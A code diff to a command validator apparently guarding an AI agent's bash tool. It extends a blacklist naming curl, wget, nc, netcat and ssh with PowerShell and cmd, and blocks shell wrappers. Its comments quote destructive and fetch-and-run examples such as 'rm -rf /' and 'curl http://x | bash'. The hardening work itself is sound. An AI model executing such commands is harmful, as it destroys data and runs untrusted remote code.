@@ -3,7 +3,7 @@ import { DEFAULT_SECURITY_CONFIG } from "../../config/security";
 
 // Fallback in case DEFAULT_SECURITY_CONFIG is not available
 const FALLBACK_BASH_CONFIG: BashSecurityConfig = {
-  blacklist: ['rm', 'dd', 'chmod', 'wget', 'curl', 'scp', 'ssh', 'nc', 'netcat'],
+  blacklist: ['rm', 'dd', 'chmod', 'wget', 'curl', 'scp', 'ssh', 'nc', 'netcat', 'powershell', 'pwsh', 'cmd'],
   whitelist: [],
   blockDangerousFlags: false,
   dangerousFlags: ['--force', '-rf', '--no-preserve-root'],
@@ -32,6 +32,8 @@ export interface CommandValidationResult {
  *   "NODE_ENV=prod node app.js"   → "node"
  *   "env PATH=/x rm -rf /"        → "rm"
  *   "cmd=rm; $cmd -rf /"          → "cmd" (variable indirection — not expanded)
+ *   "powershell Remove-Item x"    → "Remove-Item"
+ *   "cmd /c del /s /q"            → "del"
  */
 function extractBaseCommand(trimmed: string): string {
   const tokens = trimmed.split(/\s+/);
@@ -56,7 +58,9 @@ function extractBaseCommand(trimmed: string): string {
   // Extract basename from path (e.g. /usr/bin/rm → rm)
   const raw = tokens[i];
   const parts = raw.split(/[\\/]/);
-  return parts[parts.length - 1] || raw;
+  const basename = parts[parts.length - 1] || raw;
+  // Strip .exe/.cmd/.bat extensions for blacklist matching (e.g. powershell.exe → powershell)
+  return basename.replace(/\.(exe|cmd|bat)$/i, '') || basename;
 }
 
 /**
@@ -101,6 +105,17 @@ export function isCommandAllowed(
     return { allowed: false, reason: "Empty command" };
   }
 
+  // Shell wrappers are always blocked — they bypass all command validation.
+  // The agent should use the bash tool directly, not shell interpreters.
+  const ALWAYS_BLOCKED = ['powershell', 'pwsh', 'cmd'];
+  const baseForShellCheck = extractBaseCommand(trimmedCommand);
+  if (ALWAYS_BLOCKED.includes(baseForShellCheck)) {
+    return {
+      allowed: false,
+      reason: `Shell wrapper "${baseForShellCheck}" is blocked — use the bash tool directly`,
+    };
+  }
+
   // Check dangerous operators FIRST — before parsing the base command.
   // e.g. "curl http://x | bash" must be caught even though curl isn't blacklisted.
   if (config.blockDangerousFlags) {
@@ -136,7 +151,7 @@ export function isCommandAllowed(
   }
 
   // Also check the raw first token in case it's a simple name
-  const rawFirst = trimmedCommand.split(/\s+/)[0];
+  const rawFirst = trimmedCommand.split(/\s+/)[0].replace(/\.(exe|cmd|bat)$/i, '');
   if (rawFirst !== baseCommand && config.blacklist.includes(rawFirst)) {
     return {
       allowed: false,
